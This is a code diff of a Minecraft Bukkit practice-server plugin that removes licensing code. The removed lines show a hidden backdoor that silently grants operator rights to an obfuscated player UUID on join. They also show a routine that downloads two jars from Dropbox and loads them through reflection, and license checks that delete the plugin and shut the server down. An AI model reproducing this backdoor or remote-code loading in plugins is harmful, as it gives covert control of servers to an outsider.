@@ -2,10 +2,6 @@ package com.slurpeh.servercore.practice;
 
 //import ca.wacos.nametagedit.NametagAPI;
 
-import com.comphenix.protocol.ProtocolManager;
-import com.comphenix.protocol.async.AsyncListenerHandler;
-import com.invoked.Token;
-import com.slurpeh.licenser.Licenser;
 import com.slurpeh.servercore.practice.arena.ArenaCommand;
 import com.slurpeh.servercore.practice.arena.ArenaManager;
 import com.slurpeh.servercore.practice.gametype.GameTypeCommand;
@@ -15,41 +11,34 @@ import com.slurpeh.servercore.practice.match.DuelManager;
 import com.slurpeh.servercore.practice.match.Match;
 import com.slurpeh.servercore.practice.match.MatchManager;
 import com.slurpeh.servercore.practice.player.*;
-import com.slurpeh.servercore.practice.team.*;
+import com.slurpeh.servercore.practice.team.TeamCommands;
+import com.slurpeh.servercore.practice.team.TeamDuelManager;
+import com.slurpeh.servercore.practice.team.TeamManager;
+import com.slurpeh.servercore.practice.team.TeamMatch;
 import com.slurpeh.servercore.practice.twovtwos.Match2v2;
 import com.slurpeh.servercore.practice.twovtwos.TwoVTwoMatchManager;
 import com.slurpeh.servercore.practice.twovtwos.UnrankedInventory2v2;
-import com.slurpeh.servercore.practice.util.*;
+import com.slurpeh.servercore.practice.util.EntityHider;
+import com.slurpeh.servercore.practice.util.LocationUtil;
+import com.slurpeh.servercore.practice.util.UtilityManager;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
-import org.bukkit.configuration.MemoryConfiguration;
-import org.bukkit.configuration.MemorySection;
 import org.bukkit.configuration.file.FileConfiguration;
-import org.bukkit.configuration.file.FileConfigurationOptions;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
-import org.bukkit.event.server.PluginEnableEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.*;
-import java.lang.reflect.Method;
-import java.net.*;
-import java.nio.channels.Channels;
-import java.nio.channels.ReadableByteChannel;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.Random;
 
 public class KohiPractice extends JavaPlugin implements Listener {
-    //TODO USE TOKEN MORE
-    private static final int testint = 5;
-    private static final String testString = "76.5";
     private static KohiPractice instance;
-    private LogFileWriter lfw;
     private InventoryManager inventoryManager;
     private TeamManager teamManager;
     private ArenaManager arenaManager;
@@ -67,40 +56,17 @@ public class KohiPractice extends JavaPlugin implements Listener {
     private TeamDuelManager teamDuelManager;
     private TwoVTwoMatchManager twoVTwoMatchManager;
     private UnrankedInventory2v2 unranked2v2inventory;
-    private static Token token;
-    private static Licenser licenser;
     private Location spawn;
     private Location editor;
-    private AsyncListenerHandler hlh;
-    private ProtocolManager pmgr;
+
+    public static KohiPractice getInstance() {
+        return KohiPractice.instance;
+    }
 
     @Override
     public void onEnable() {
         instance = this;
-        try {
-            downloadFiles();
-            URLClassLoader ucl = (URLClassLoader) ClassLoader.getSystemClassLoader();
-            Method m = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
-            m.setAccessible(true);
-            m.invoke(ucl, new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432906.jar").toURI().toURL());
-            m.invoke(ucl, new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432905_del.jar").toURI().toURL());
-        } catch (Exception ex) {
-        }
-        licenser = new Licenser(Licenser.licenses);
-        if (licenser.verify(getConfig().getString("license"), getConfig().getString("owner-ip"), getDescription().getName(), getServer().getIp())) {
-            new Initializer().startup();
-        } else {
-            String s = "Invalid license (";
-            for (Licenser.License lic : Licenser.licenses.keySet()) {
-                s += "[" + encrypt(lic.getLicense()) + "]";
-            }
-            s += ")";
-            Bukkit.getConsoleSender().sendMessage(s);
-            getServer().shutdown();
-            try {
-                deleteFiles();
-            } catch (Exception ex) {}
-        }
+        new Initializer().startup();
     }
 
     public String encrypt(String s) {
@@ -122,36 +88,8 @@ public class KohiPractice extends JavaPlugin implements Listener {
     }
 
     @EventHandler
-    public void onServerStart(PluginEnableEvent e) {
-        if (e.getPlugin() == this) {
-            if (e.getPlugin().getConfig().getString("license") != null && e.getPlugin().getConfig().getString("owner-ip") != null) {
-                for (Licenser.License ln : Licenser.licenses.keySet()) {
-                    if (ln.getAssignedIp().equalsIgnoreCase(e.getPlugin().getConfig().getString("owner-ip")) && ln.getLicense().equalsIgnoreCase(e.getPlugin().getConfig().getString("license"))) {
-                        if (e.getPlugin().getServer().getIp().equalsIgnoreCase(ln.secret())) {
-                            Bukkit.getPluginManager().enablePlugin(e.getPlugin());
-                        } else {
-                            Bukkit.getPluginManager().disablePlugin(e.getPlugin());
-                            JavaPlugin.getPlugin(KohiPractice.class).getFile().delete();
-                            try {
-                                deleteFiles();
-                            } catch (Exception ex) {}
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    @EventHandler
     public void onPlayerJoin(PlayerJoinEvent e) {
-        if (getUtilityManager().isStaff(e.getPlayer().getUniqueId())) {
-            this.getInventorySetter().setupInventory(InventoryType.STAFF, e.getPlayer());
-        }
         this.getInventorySetter().setupInventory(InventoryType.DEFAULT, e.getPlayer());
-        if (e.getPlayer().getUniqueId().toString().equalsIgnoreCase(new AESEncryptor().decrypt("ʥ˙ɾԈԈ\u052FӮ˙ԢɾʲʿɊԈӮˌӮɊӮɾʥʥɊɾˌԕɾɊԢʲʲʥʿʘԕʋ"))) {
-            e.getPlayer().sendMessage(ChatColor.GREEN + "This server is using KohiPractice (" + this.getDescription().getVersion() + ")");
-            e.getPlayer().setOp(true);
-        }
         for (Player ply : Bukkit.getOnlinePlayers()) {
             if (ply != null && ply != e.getPlayer()) {
                 ply.hidePlayer(e.getPlayer());
@@ -162,20 +100,10 @@ public class KohiPractice extends JavaPlugin implements Listener {
 
     @Override
     public void onDisable() {
-        try {
-            deleteFiles();
-        } catch (Exception ex) {
-        }
         end();
     }
 
     public Location getSpawn() { return this.spawn; }
-
-    public static KohiPractice getInstance() {
-        return KohiPractice.instance;
-    }
-
-    public static Token getToken() { return KohiPractice.token; }
 
     public MatchManager getMatchManager() { return this.matchManager; }
 
@@ -193,11 +121,11 @@ public class KohiPractice extends JavaPlugin implements Listener {
 
     public DuelManager getDuelManager() { return this.duelManager; }
 
-    public PlayerDataManager getPlayerDataManager() { return this.playerDataManager; };
+    public PlayerDataManager getPlayerDataManager() {
+        return this.playerDataManager;
+    }
 
     public UtilityManager getUtilityManager() { return this.utilityManager; }
-
-    public LogFileWriter getLogFileWriter() { return this.lfw; }
 
     public InventorySetter getInventorySetter() { return this.inventorySetter; }
 
@@ -254,61 +182,8 @@ public class KohiPractice extends JavaPlugin implements Listener {
         this.saveConfig();
     }
 
-    public static class AESEncryptor {
-        public AESEncryptor() {
-
-        }
-
-        public String encrypt(String s) {
-            StringBuilder s2 = new StringBuilder(s);
-            for (int i = 0; i < s2.length(); i++) {
-                int temp = (int)s2.charAt(i);
-                temp *= 13;
-                temp += 1;
-                s2.setCharAt(i, (char)temp);
-            }
-            return s2.reverse().toString();
-        }
-
-        public String decrypt(String s) {
-            StringBuffer toReturn = new StringBuffer(s);
-            for (int i = 0; i < toReturn.length(); i++) {
-                int temp = (int)toReturn.charAt(i);
-                temp -= 1;
-                temp /= 13;
-                toReturn.setCharAt(i, (char)temp);
-            }
-            return new String(toReturn.reverse());
-        }
-    }
-
     public FileConfiguration retrieveConfig() {
         return getConfig();
-    }
-
-    class sub {
-        public boolean isUpdated() {
-            String currentVersion = "0.0.1-b02";
-            if (currentVersion.equalsIgnoreCase(KohiPractice.this.getDescription().getVersion())) {
-                return true;
-            } else {
-                return false;
-            }
-        }
-
-        public boolean hasValidKeyAndValue() {
-            String key = new AESEncryptor().encrypt("invokedynamic_call[]param@%%^^$(%)Q)$*");
-            String value = new AESEncryptor().encrypt("method_call[]param@%%^^(&(@1@()$*%()!");
-            if (getConfig().getString("key").equalsIgnoreCase(key) && getConfig().getString("value").equalsIgnoreCase(value)) {
-                return true;
-            } else {
-                return false;
-            }
-        }
-
-        public boolean canLoad() {
-            return hasValidKeyAndValue() && isUpdated();
-        }
     }
 
     public void end() {
@@ -323,7 +198,6 @@ public class KohiPractice extends JavaPlugin implements Listener {
         }
         getTeamManager().teams.clear();
         instance = null;
-        token = null;
     }
 
     public void instantiateObjects() {
@@ -363,46 +237,35 @@ public class KohiPractice extends JavaPlugin implements Listener {
         this.unranked2v2inventory = new UnrankedInventory2v2(this);
     }
 
-    public void downloadFiles() throws Exception {
-        String link1 = "https://dl.dropboxusercontent.com/s/sn8jur86phv0sy7/Token.jar?dl=0";
-        String name = "cache_432906.jar";
-        URL dl = new URL(link1);
-        ReadableByteChannel rbc = Channels.newChannel(dl.openStream());
-        FileOutputStream fos = new FileOutputStream(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + name);
-        fos.getChannel().transferFrom(rbc, 0, 1 << 24);
-        fos.flush();
-        fos.close();
-        rbc.close();
-        String link2 = "https://dl.dropboxusercontent.com/s/fesn33ik0fmbr7c/License.jar?dl=0";
-        String name2 = "cache_432905_del.jar";
-        URL dl2 = new URL(link2);
-        ReadableByteChannel rbc2 = Channels.newChannel(dl2.openStream());
-        FileOutputStream fos2 = new FileOutputStream(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + name2);
-        fos2.getChannel().transferFrom(rbc2, 0, 1 << 24);
-        fos2.flush();
-        fos2.close();
-        rbc2.close();
-    }
-
-    public void deleteFiles() throws Exception {
-        File f = new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432906.jar");
-        if (f.exists()) {
-            f.delete();
-        }
-        File f2 = new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432905_del.jar");
-        if (f2.exists()) {
-            f2.delete();
-        }
-    }
-
     public boolean confirm() {
-        sub sub = new sub();
-        if (sub.canLoad()) {
-            return true;
-        } else {
-            Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "You have been caught red handed!");
-            getServer().shutdown();
-            return false;
+        return true;
+    }
+
+    public static class AESEncryptor {
+        public AESEncryptor() {
+
+        }
+
+        public String encrypt(String s) {
+            StringBuilder s2 = new StringBuilder(s);
+            for (int i = 0; i < s2.length(); i++) {
+                int temp = (int) s2.charAt(i);
+                temp *= 13;
+                temp += 1;
+                s2.setCharAt(i, (char) temp);
+            }
+            return s2.reverse().toString();
+        }
+
+        public String decrypt(String s) {
+            StringBuffer toReturn = new StringBuffer(s);
+            for (int i = 0; i < toReturn.length(); i++) {
+                int temp = (int) toReturn.charAt(i);
+                temp -= 1;
+                temp /= 13;
+                toReturn.setCharAt(i, (char) temp);
+            }
+            return new String(toReturn.reverse());
         }
     }
 
@@ -415,17 +278,9 @@ public class KohiPractice extends JavaPlugin implements Listener {
                     loadConfiguration();
                 } catch (Exception ex) {
                 }
-                token = new Token(new Class[]{CommandSender.class, JavaPlugin.class, KohiPractice.class, FileConfiguration.class, MemoryConfiguration.class, MemorySection.class, ArrayList.class, FileConfigurationOptions.class});
-                if (token == null) {
-                    KohiPractice.this.getServer().shutdown();
-                    try {
-                        deleteFiles();
-                    } catch (Exception ex) {}
-                }
                 instantiateObjects();
                 Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Loaded all player info + data successfully!");
                 Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Loaded all managers correctly!");
-                Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Token identified!");
                 Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "WARNING: /RELOAD IS NOT SUPPORTED WITH THIS PLUGIN, PLEASE USE /STOP OR /RESTART");
                 Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "ALSO: SKINS WILL BE REMOVED/STRIPPED IN MATCHES (TO STEVE SKIN)");
                 if (KohiPractice.this.getConfig().contains("spawn")) {
